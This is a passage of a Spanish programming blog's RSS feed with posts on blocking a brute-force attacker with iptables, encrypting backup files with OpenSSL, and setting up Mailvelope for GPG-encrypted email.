&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;iptables -i ethX -A INPUT -s xx.xx.xx.xx -j LOG --log-prefix &lt;span class=&#34;s2&#34;&gt;&amp;quot;IP DROP SPOOF A:&amp;quot;&lt;/span&gt;
iptables -i ethX -A INPUT -s xx.xx.xx.xx -j DROP
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Estas directivas bloquean el tráfico entrante hacia la interfaz &lt;em&gt;ethX&lt;/em&gt; a la dirección especificada tras el parámetro &lt;em&gt;-s&lt;/em&gt;, además, en las entradas del log aparecerá como &lt;strong&gt;IP DROP SPOOF A:&lt;/strong&gt; cada vez que el firewall bloquee el intento de conexión.&lt;/p&gt;

&lt;p&gt;El primer comando es el que define cómo se registrará en el log, el segundo es el que bloquea la dirección.&lt;/p&gt;

&lt;p&gt;Para comprobar que efectivamente se está bloqueando al atacante, basta con mirar al log:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;Feb  &lt;span class=&#34;m&#34;&gt;5&lt;/span&gt; 02:15:30 NOMBRESERVIDOR kernel: IP DROP SPOOF A:IN&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;ethX &lt;span class=&#34;nv&#34;&gt;OUT&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;MAC&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;XX:XX:XX:XX:XX:XX:XX:XX:XX:XX:XX:XX:XX &lt;span class=&#34;nv&#34;&gt;SRC&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;IPBLOQUEADA &lt;span class=&#34;nv&#34;&gt;DST&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;IPSERVIDOR &lt;span class=&#34;nv&#34;&gt;LEN&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;LONGITUDPAQUETE &lt;span class=&#34;nv&#34;&gt;TOS&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0x00 &lt;span class=&#34;nv&#34;&gt;PREC&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0x00 &lt;span class=&#34;nv&#34;&gt;TTL&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;117&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;ID&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;15234&lt;/span&gt; DF &lt;span class=&#34;nv&#34;&gt;PROTO&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;TCP &lt;span class=&#34;nv&#34;&gt;SPT&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;17652&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;DPT&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;PUERTODESTINO &lt;span class=&#34;nv&#34;&gt;WINDOW&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;65535&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;RES&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0x00 SYN &lt;span class=&#34;nv&#34;&gt;URGP&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Decidí investigar desde cuando se estaba produciendo el ataque, y, para mi sorpresa, se estaba intentando acceder por fuerza bruta al blog desde hacía 8 días. Concretamente, hubo &lt;strong&gt;18209&lt;/strong&gt; intentos de conexión. Este número puede sacarse fácilmente contando las líneas del log en las que estaba involucrada la ip atacante:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;cat /ruta/log/acceso.log &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; grep xx.xx.xx.xx &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; wc -l
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Donde &lt;strong&gt;xx.xx.xx.xx&lt;/strong&gt; debe ser la ip del atacante. El comando wc con el parámetro -l es el encargado de contar las líneas.&lt;/p&gt;

&lt;p&gt;En las referencias puedes encontrar más información sobre iptables. También puedes leer los &lt;strong&gt;&lt;a href=&#34;https://elbauldelprogramador.com/20-ejemplos-de-iptables-para-sysadmins/&#34;&gt;20 ejemplos de iptables para SysAdmins novatos&lt;/a&gt;&lt;/strong&gt; o &lt;a href=&#34;https://elbauldelprogramador.com/bloquear-ataques-de-fuerza-bruta-en-nginx-y-wordpress-con-fail2ban/&#34; title=&#34;Bloquear ataques de fuerza bruta en Nginx y WordPress con Fail2Ban&#34;&gt;Bloquear ataques de fuerza bruta en Nginx y WordPress con Fail2Ban&lt;/a&gt;&lt;/p&gt;

&lt;h1 id=&#34;referencias&#34;&gt;Referencias&lt;/h1&gt;

&lt;ul&gt;
&lt;li&gt;&lt;em&gt;Iptables Drop IP Address&lt;/em&gt; »» &lt;a href=&#34;http://www.cyberciti.biz/faq/linux-iptables-drop/&#34; target=&#34;_blank&#34;&gt;Visitar sitio&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description>
        </item>
        
        <item>
            <title>Chema Alonso hablando de la inseguridad de las vías telemáticas</title>
            <link>https://elbauldelprogramador.com/chema-alonso-hablando-de-la-inseguridad/</link>
            <pubDate>Fri, 01 Jan 2016 00:00:00 +0000</pubDate>
            
            <guid>https://elbauldelprogramador.com/chema-alonso-hablando-de-la-inseguridad/</guid>
            <description>&lt;p&gt;OS dejo dos vídeos muy interesantes que recomiendo que veáis, ya que hablan de la seguridad en la red:&lt;/p&gt;

&lt;figure&gt;
    &lt;amp-youtube
        data-videoid=&#34;8dBH1ocToFw&#34;
        layout=&#34;responsive&#34;
        width=&#34;480&#34; height=&#34;270&#34;&gt;
    &lt;/amp-youtube&gt;
&lt;/figure&gt;

&lt;p&gt;&lt;!--ad--&gt;&lt;/p&gt;

&lt;p&gt;Vía &lt;a target=&#34;_blank&#34; href=&#34;http://www.genbetadev.com/seguridad-informatica/chema-alonso-un-crack-hablando-de-la-inseguridad-de-las-vias-telematicas&#34;&gt;Genbeta&lt;/a&gt;&lt;/p&gt;</description>
        </item>
        
        <item>
            <title>Cómo cifrar archivos con openssl</title>
            <link>https://elbauldelprogramador.com/como-cifrar-archivos-con-openssl/</link>
            <pubDate>Fri, 01 Jan 2016 00:00:00 +0000</pubDate>
            
            <guid>https://elbauldelprogramador.com/como-cifrar-archivos-con-openssl/</guid>
            <description>&lt;figure&gt;
          &lt;img
            on=&#34;tap:lightbox1&#34;
            role=&#34;button&#34;
            tabindex=&#34;0&#34;
            layout=&#34;responsive&#34;
            src=&#34;https://elbauldelprogramador.com/img/2012/11/Apps-preferences-desktop-cryptography-icon1.png&#34;
            alt=&#34;Cómo cifrar archivos con openssl&#34;
            title=&#34;Cómo cifrar archivos con openssl&#34;
            sizes=&#34;(min-width: 256px) 256px, 100vw&#34;
            width=&#34;256&#34;
            height=&#34;256&#34;&gt;
          &lt;/img&gt;
&lt;/figure&gt;

&lt;p&gt;Las copias de seguridad son algo que debemos tener a buen resguardo por si algún dia le ocurre algo a nuestros datos. Si bien lo anterior es cierto, de igual modo hemos de tener bien protegidas éstas copias de seguridad para que no puedan ser usadas por terceros de caer en manos maliciosas. Hoy veremos cómo &lt;strong&gt;cifrar archivos con openssl&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;!--ad--&gt;&lt;/p&gt;

&lt;h1 id=&#34;generar-las-claves-públicas-y-privadas&#34;&gt;Generar las claves públicas y privadas&lt;/h1&gt;

&lt;p&gt;Al igual que en &lt;a href=&#34;https://elbauldelprogramador.com/editar-y-crear-archivos-cifrados-con-gpg-en-vim/&#34;&gt;GPG&lt;/a&gt;, necesitaremos generar un par de claves, pública y privada, para poder cifrar archivos con openssl:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;$ openssl genrsa -out clave.pem 4096
$ openssl rsa -in clave.pem -out clave.pub.pem -outform PEM -pubout
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Con el primer comando generamos la clave, en &lt;em&gt;clave.pem&lt;/em&gt; se encuentran tanto la clave privada como la pública, con el segundo comando extraemos la pública a un archivo distinto.&lt;/p&gt;

&lt;h1 id=&#34;método-elegido-para-cifrar-los-archivos&#34;&gt;Método elegido para cifrar los archivos&lt;/h1&gt;

&lt;p&gt;El sistema de claves pública/privada no puede cifrar archivos de gran tamaño. Por tanto usaremos un &lt;a href=&#34;http://es.wikipedia.org/wiki/Criptograf%C3%ADa_sim%C3%A9trica&#34; target=&#34;_blank&#34;&gt;cifrado simétrico&lt;/a&gt; para el cifrado normal. Cada vez que cifremos un fichero se usará una clave simétrica generada aleatoriamente. Esta clave simétrica es la que &lt;strong&gt;cifraremos de forma &lt;a href=&#34;http://es.wikipedia.org/wiki/Criptograf%C3%ADa_asim%C3%A9trica&#34; target=&#34;_blank&#34;&gt;asimétrica&lt;/a&gt;&lt;/strong&gt; con la &lt;strong&gt;llave pública&lt;/strong&gt; que hemos generado con los comandos de arriba. En resumen:&lt;/p&gt;

&lt;h2 id=&#34;para-cifrar-los-archivos&#34;&gt;Para cifrar los archivos&lt;/h2&gt;

&lt;ol&gt;
&lt;li&gt;Generamos una clave aleatoriamente, de gran longitud (40-50 caracteres por ejemplo).&lt;/li&gt;
&lt;li&gt;Ciframos el archivo con la clave generada en 1.&lt;/li&gt;
&lt;li&gt;Ciframos la clave generada en 1 con nuestra clave pública.&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&#34;para-descifrar-los-archivos&#34;&gt;Para descifrar los archivos&lt;/h2&gt;

&lt;ol&gt;
&lt;li&gt;Desciframos la clave generada en 1 y cifrada con la llave pública en 3&lt;/li&gt;
&lt;li&gt;Desciframos el archivo con la clave que acabamos de descifrar en 1&lt;/li&gt;
&lt;/ol&gt;

&lt;h1 id=&#34;aplicar-los-pasos-con-openssl&#34;&gt;Aplicar los pasos con openssl&lt;/h1&gt;

&lt;p&gt;Ahora procedemos a aplicar los pasos descritos anteriormente con openssl:&lt;/p&gt;

&lt;h2 id=&#34;cifrando-los-archivos&#34;&gt;Cifrando los archivos&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;# Paso 1, generar clave aleatoria&lt;/span&gt;
$ openssl rand -base64 &lt;span class=&#34;m&#34;&gt;48&lt;/span&gt; -out key.txt
&lt;span class=&#34;c1&#34;&gt;# Paso 2, cifrar el archivo con la clave simétrica&lt;/span&gt;
$ openssl enc -aes-256-cbc -pass file:key.txt -in archivoSINcifrar -out archivoCIFRADO.encrypted
&lt;span class=&#34;c1&#34;&gt;# Paso 3, cifrar la clave generada en el paso 1 con la llave pública&lt;/span&gt;
$ openssl rsautl -encrypt -in key.txt -out key.enc -inkey clave.pub.pem -pubin
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Los argumentos significan:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;enc -aes-256-cbc:&lt;/strong&gt; Tipo de cifrado simétrico.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;-pass file:key.txt:&lt;/strong&gt; La clave con la que cifrar el archivo.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;-in:&lt;/strong&gt; Fichero de entrada.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;-out:&lt;/strong&gt; Fichero de salida.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;rsautl:&lt;/strong&gt; Indica que vamos a usar RSA para firmar, verificar, cifrar o descifrar.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;-encrypt:&lt;/strong&gt; Encriptar el fichero de entrada con una llave RSA pública.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;-inkey:&lt;/strong&gt; Llave con la que cifrar&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;-pubin:&lt;/strong&gt; Indica que vamos a firmar con una llave pública.&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;descifrado-de-archivos&#34;&gt;Descifrado de archivos&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;# Paso 1, desciframos la clave generada en 1 y cifrada con la llave pública en 3&lt;/span&gt;
$ openssl rsautl -decrypt -inkey ./clave.pem -in key.enc -out key.txt
&lt;span class=&#34;c1&#34;&gt;# Paso 2, Descifrar el archivo con la clave&lt;/span&gt;
$ openssl enc -aes-256-cbc -d -pass file:key.txt -in archivoCIFRADO.encrypted -out archivoSINcifrar
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Donde:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;-d:&lt;/strong&gt; Descifra los datos de entrada.&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&#34;script-para-descifrar-varios-archivos-de-una-vez&#34;&gt;Script para descifrar varios archivos de una vez&lt;/h1&gt;

&lt;p&gt;Como suele ser habitual, los &lt;a href=&#34;https://elbauldelprogramador.com/&#34;&gt;scripts bash&lt;/a&gt; nos facilitan las tareas repetitivas, con los comandos de arriba, es trivial escribir un &lt;strong&gt;script&lt;/strong&gt; que automatize el proceso de descrifrar todos los archivos de un directorio:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;#/bin/bash&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$#&lt;/span&gt; -ne &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;then&lt;/span&gt;
    &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;quot;Usage: &lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$0&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; &amp;lt;directorio a=&amp;quot;&lt;/span&gt;a&lt;span class=&#34;s2&#34;&gt;&amp;quot; los=&amp;quot;&lt;/span&gt;los&lt;span class=&#34;s2&#34;&gt;&amp;quot; archivos=&amp;quot;&lt;/span&gt;archivos&lt;span class=&#34;s2&#34;&gt;&amp;quot; cifrados=&amp;quot;&lt;/span&gt;cifrados&lt;span class=&#34;s2&#34;&gt;&amp;quot;&amp;gt;&amp;quot;&lt;/span&gt;
    &lt;span class=&#34;nb&#34;&gt;exit&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;fi&lt;/span&gt;

openssl rsautl -decrypt -inkey ./clave.pem -in &lt;span class=&#34;s2&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$1&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;/key.enc&amp;quot;&lt;/span&gt; -out &lt;span class=&#34;s2&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$1&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;/key.txt&amp;quot;&lt;/span&gt;
&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;quot;openssl rsautl -decrypt -inkey ./clave.pem -in \&amp;quot;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$1&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;/key.enc\&amp;quot; -out \&amp;quot;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$1&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;/key.txt\&amp;quot;&amp;quot;&lt;/span&gt;

&lt;span class=&#34;nv&#34;&gt;OIFS&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;quot;&lt;/span&gt;$&lt;span class=&#34;s2&#34;&gt;IFS&amp;quot;&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;IFS&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;$&amp;#39;\n&amp;#39;&lt;/span&gt;


&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; i in &lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;find &lt;span class=&#34;nv&#34;&gt;$1&lt;/span&gt; -type f -name &lt;span class=&#34;s2&#34;&gt;&amp;quot;*.encrypted&amp;quot;&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;do&lt;/span&gt;
    &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;quot;Decrypting &lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$1&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;/&lt;/span&gt;$&lt;span class=&#34;s2&#34;&gt;i&amp;quot;&lt;/span&gt;
    openssl enc -aes-256-cbc -d -pass file:&lt;span class=&#34;s2&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$1&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;/key.txt&amp;quot;&lt;/span&gt; -in &lt;span class=&#34;s2&#34;&gt;&amp;quot;&lt;/span&gt;$&lt;span class=&#34;s2&#34;&gt;i&amp;quot;&lt;/span&gt; -out &lt;span class=&#34;nv&#34;&gt;$1&lt;/span&gt;/&lt;span class=&#34;k&#34;&gt;$(&lt;/span&gt;basename &lt;span class=&#34;s2&#34;&gt;&amp;quot;&lt;/span&gt;$&lt;span class=&#34;s2&#34;&gt;i&amp;quot;&lt;/span&gt; .encrypted&lt;span class=&#34;k&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;done&lt;/span&gt;

&lt;span class=&#34;nv&#34;&gt;IFS&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;quot;&lt;/span&gt;$&lt;span class=&#34;s2&#34;&gt;OIFS&amp;quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Espero que os sea de utilidad.&lt;/p&gt;

&lt;h1 id=&#34;referencias&#34;&gt;Referencias&lt;/h1&gt;

&lt;ul&gt;
&lt;li&gt;&lt;em&gt;Encrypt tar.gz file on create&lt;/em&gt; »» &lt;a href=&#34;http://askubuntu.com/questions/95920/encrypt-tar-gz-file-on-create/96182#96182&#34; target=&#34;_blank&#34;&gt;askubuntu.com&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;em&gt;how to encrypt a large file in openssl using public key&lt;/em&gt; »» &lt;a href=&#34;http://stackoverflow.com/questions/7143514/how-to-encrypt-a-large-file-in-openssl-using-public-key&#34; target=&#34;_blank&#34;&gt;stackoverflow.com&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;em&gt;Documentación oficial de openssl&lt;/em&gt; »» &lt;a href=&#34;http://www.openssl.org/docs/apps/openssl.html&#34; target=&#34;_blank&#34;&gt;Visitar sitio&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description>
        </item>
        
        <item>
            <title>Cómo cifrar correos electrónicos con GPG usando Mailvelope</title>
            <link>https://elbauldelprogramador.com/como-cifrar-correos-con-gpg-con-mailvelope/</link>
            <pubDate>Fri, 01 Jan 2016 00:00:00 +0000</pubDate>
            
            <guid>https://elbauldelprogramador.com/como-cifrar-correos-con-gpg-con-mailvelope/</guid>
            <description>&lt;figure&gt;
          &lt;img
            on=&#34;tap:lightbox1&#34;
            role=&#34;button&#34;
            tabindex=&#34;0&#34;
            layout=&#34;responsive&#34;
            src=&#34;https://elbauldelprogramador.com/img/2013/04/GnuPG-Logo.png&#34;
            alt=&#34;Cómo cifrar correos con GPG usando Mailvelope&#34;
            title=&#34;Cómo cifrar correos con GPG usando Mailvelope&#34;
            sizes=&#34;(min-width: 400px) 400px, 100vw&#34;
            width=&#34;400&#34;
            height=&#34;175&#34;&gt;
          &lt;/img&gt;
&lt;/figure&gt;

&lt;p&gt;En estos tiempos en los que está claro que estamos sometidos a vigilancia de los gobiernos, es posible que queramos un poco de privacidad cuando nos comunicamos por la red. Hoy voy a explicar cómo configurar un plugin para Firefox y Chrome que nos permitirá enviar correos de forma segura mediante &lt;a href=&#34;https://elbauldelprogramador.com/tags/gpg&#34;&gt;GPG&lt;/a&gt;, &lt;strong&gt;Mailvelope&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;!--ad--&gt;&lt;/p&gt;

&lt;h1 id=&#34;introducción&#34;&gt;Introducción&lt;/h1&gt;

&lt;p&gt;En otro artículo vimos &lt;a href=&#34;https://elbauldelprogramador.com/editar-y-crear-archivos-cifrados-con-gpg-en-vim/&#34; title=&#34;Editar y crear archivos cifrados con GPG en Vim&#34;&gt;cómo cifrar archivos mediante GPG&lt;/a&gt;, en esta ocasión se trata de lo mismo, pero cifrando el contenido de correos electrónicos.&lt;/p&gt;

&lt;h1 id=&#34;descargar-e-instalar-mailvelope-en-chrome&#34;&gt;Descargar e instalar Mailvelope en Chrome&lt;/h1&gt;

&lt;p&gt;Los usuarios de este navegador simplemente deben instalar Mailvelope como cualquier otro plugin en la siguiente &lt;a href=&#34;https://chrome.google.com/webstore/detail/mailvelope/kajibbejlbohfaggdiogboambcijhkke?hl=en-US&#34; title=&#34;Instalar Mailvelope en Chrome&#34; target=&#34;_blank&#34;&gt;dirección&lt;/a&gt;.&lt;/p&gt;

&lt;h1 id=&#34;descargar-e-instalar-mailvelope-en-firefox&#34;&gt;Descargar e instalar Mailvelope en Firefox&lt;/h1&gt;

&lt;p&gt;El plugin aún no está disponible de forma oficial para firefox, pero podemos usar su repositorio en &lt;a href=&#34;https://elbauldelprogramador.com/mini-tutorial-y-chuleta-de-comandos-git/&#34; title=&#34;Git: Mini Tutorial y chuleta de comandos&#34;&gt;Git&lt;/a&gt; para compilarlo e instalarlo. Los siguientes pasos se han extraído de la &lt;a href=&#34;https://github.com/mailvelope/mailvelope&#34; title=&#34;Compilar Mailvelope&#34; target=&#34;_blank&#34;&gt;documentación oficial&lt;/a&gt;:&lt;/p&gt;

&lt;p&gt;Otra opción es descargarlo de &lt;a href=&#34;https://www.mailvelope.com/&#34; title=&#34;Página oficial de Mailvelope&#34;&gt;mailvelope.com&lt;/a&gt;.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;NOTA&lt;/strong&gt;: Actualmente ya disponen de extensión para firefox, puedes saltarte este paso.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;git clone git://github.com/mozilla/addon-sdk.git
&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; addon-sdk
&lt;span class=&#34;nb&#34;&gt;source&lt;/span&gt; bin/activate
&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; ..
git clone git://github.com/toberndo/mailvelope.git
&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; mailvelope
git checkout -t origin/firefox
git submodule init
git submodule update
make build
make dist-ff
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Tras esto, en &lt;strong&gt;dist/mailvelope.xpi&lt;/strong&gt; se encuentra el plugin para instalarlo.&lt;/p&gt;

&lt;h1 id=&#34;generar-llaves-en-mailvelope&#34;&gt;Generar llaves en Mailvelope&lt;/h1&gt;

&lt;p&gt;Una vez instalado mailvelope en el navegador correspondiente, hacemos &lt;strong&gt;click en el icono del plugin » opciones&lt;/strong&gt;. Aparecerá un formulario que rellenaremos con un nombre, el correo a usar y un &lt;strong&gt;passphrase&lt;/strong&gt;, en las opciones avanzadas podemos elegir el algoritmo de cifrado, la longitud y la fecha de expiración:&lt;/p&gt;

&lt;figure&gt;
          &lt;img
            on=&#34;tap:lightbox1&#34;
            role=&#34;button&#34;
            tabindex=&#34;0&#34;
            layout=&#34;responsive&#34;
            src=&#34;https://elbauldelprogramador.com/img/2013/08/Cómo-cifrar-correos-con-GPG-usando-Mailvelope.png&#34;
            alt=&#34;Cómo cifrar correos con GPG usando Mailvelope&#34;
            title=&#34;Cómo cifrar correos con GPG usando Mailvelope&#34;
            sizes=&#34;(min-width: 610px) 610px, 100vw&#34;
            width=&#34;610&#34;
            height=&#34;619&#34;&gt;
          &lt;/img&gt;
&lt;/figure&gt;

&lt;h1 id=&#34;enviar-la-clave-pública-a-un-servidor-de-llaves&#34;&gt;Enviar la clave pública a un servidor de llaves&lt;/h1&gt;

&lt;p&gt;El par de claves pública/privada que acabamos de generar debe aparecer en &lt;em&gt;Display keys&lt;/em&gt;. La seleccionamos y hacemos click en &lt;strong&gt;Export » Display public key&lt;/strong&gt;, copiamos la llave y la pegamos en la sección &lt;strong&gt;Submission And Publication&lt;/strong&gt; del servidor de llaves &lt;a href=&#34;http://keyserver.borgnet.us/&#34; target=&#34;_blank&#34;&gt;keyserver.borgnet.us&lt;/a&gt;. A partir de ahora, cualquiera que tenga a su disposición la clave pública que acabamos de subir al servidor podrá enviarnos un correo cifrado.&lt;/p&gt;

&lt;h1 id=&#34;ejemplo&#34;&gt;Ejemplo&lt;/h1&gt;

&lt;p&gt;Vamos a poner un ejemplo con la cuenta de correo de contacto de este blog. El primer paso es obtener la clave pública que se encuentra en la página de &lt;a href=&#34;https://elbauldelprogramador.com/contacto&#34; title=&#34;Contacto&#34;&gt;contacto&lt;/a&gt; o en este otro &lt;a href=&#34;http://keyserver.borgnet.us:11371/pks/lookup?op=get&amp;search=0x083EDE12BE101B2B&#34; target=&#34;_blank&#34;&gt;enlace&lt;/a&gt;. La copiamos y en la sección &lt;strong&gt;Import Keys&lt;/strong&gt; de Mailvelope la pegamos. Ahora mi clave pública se encuentra en tu anillo de claves.&lt;/p&gt;

&lt;p&gt;Como es la primera vez que ambas cuentas de correo van a ponerse en contacto, para que yo pueda enviar correos cifrados debo conocer la clave pública del otro usuario. Mailvelope dispone de una opción que permite enviar la clave pública por correo en Display Keys » (Seleccionamos la clave deseada) » Export » Send Public Key by email. Si por algún motivo no funcionara simplemente copiamos la clave pública y la pegamos en el correo como parte del mensaje. Otra opción es proporcionar el enlace del servidor de claves donde reside.&lt;/p&gt;

&lt;figure&gt;
        &lt;a href=&#34;https://elbauldelprogramador.com/img/2013/08/Cómo-cifrar-correos-con-GPG-usando-Mailvelope1.png&#34;&gt;
          &lt;img
            on=&#34;tap:lightbox1&#34;
            role=&#34;button&#34;
            tabindex=&#34;0&#34;
            layout=&#34;responsive&#34;
            src=&#34;https://elbauldelprogramador.com/img/2013/08/Cómo-cifrar-correos-con-GPG-usando-Mailvelope1.png&#34;
            alt=&#34;Cómo cifrar correos con GPG usando Mailvelope&#34;
            title=&#34;Cómo cifrar correos con GPG usando Mailvelope&#34;
            sizes=&#34;(min-width: 597px) 597px, 100vw&#34;
            width=&#34;597&#34;
            height=&#34;592&#34;&gt;
          &lt;/img&gt;
        &lt;/a&gt;
&lt;/figure&gt;

&lt;p&gt;Como vemos en la imagen, aparece un simbolo a la derecha, tenemos que pulsarlo y escribir en mensaje ahí:&lt;/p&gt;

&lt;figure&gt;
        &lt;a href=&#34;https://elbauldelprogramador.com/img/2013/08/Cómo-cifrar-correos-con-GPG-usando-Mailvelope2.png&#34;&gt;
          &lt;img
            on=&#34;tap:lightbox1&#34;
            role=&#34;button&#34;
            tabindex=&#34;0&#34;
            layout=&#34;responsive&#34;
            src=&#34;https://elbauldelprogramador.com/img/2013/08/Cómo-cifrar-correos-con-GPG-usando-Mailvelope2.png&#34;
            alt=&#34;Cómo cifrar correos con GPG usando Mailvelope&#34;
            title=&#34;Cómo cifrar correos con GPG usando Mailvelope&#34;
            sizes=&#34;(min-width: 800px) 800px, 100vw&#34;
            width=&#34;1255&#34;
            height=&#34;978&#34;&gt;
          &lt;/img&gt;
        &lt;/a&gt;
&lt;/figure&gt;

